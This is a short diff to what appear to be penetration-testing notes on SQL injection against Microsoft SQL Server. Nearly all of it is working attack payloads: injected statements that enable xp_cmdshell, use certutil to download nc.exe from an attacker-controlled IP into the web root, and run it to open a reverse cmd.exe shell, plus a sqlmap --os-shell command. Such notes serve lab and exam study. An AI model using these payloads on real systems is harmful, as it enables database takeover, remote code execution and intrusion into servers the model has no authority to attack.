@@ -224,3 +224,17 @@ nc -nlpv 443
 ';EXEC xp_cmdshell "c:/windows/temp/nc.exe 192.168.45.181 443 -e cmd.exe";--
 
 └─$ sqlmap -r r**eq.txt** --os-shell --batch   --file from the POST that you save
+
+
+';EXEC sp_configure 'show advanced options', 1;--
+
+';RECONFIGURE;--
+
+';EXEC sp_configure "xp_cmdshell", 1;--
+
+';RECONFIGURE;--
+
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.181/nc.exe c:\inetpub\wwwroot\nc.exe";--                PATH IS FROM THE SQL ERROR
+                                               OPEN A HTTP SERVER FROM WHERE THE FILE IS
+
+';EXEC xp_cmdshell -p c:\inetpub\wwwroot\nc.exe "c:\inetpub\wwwroot\nc.exe -e cmd.exe 192.168.45.181 443";--      
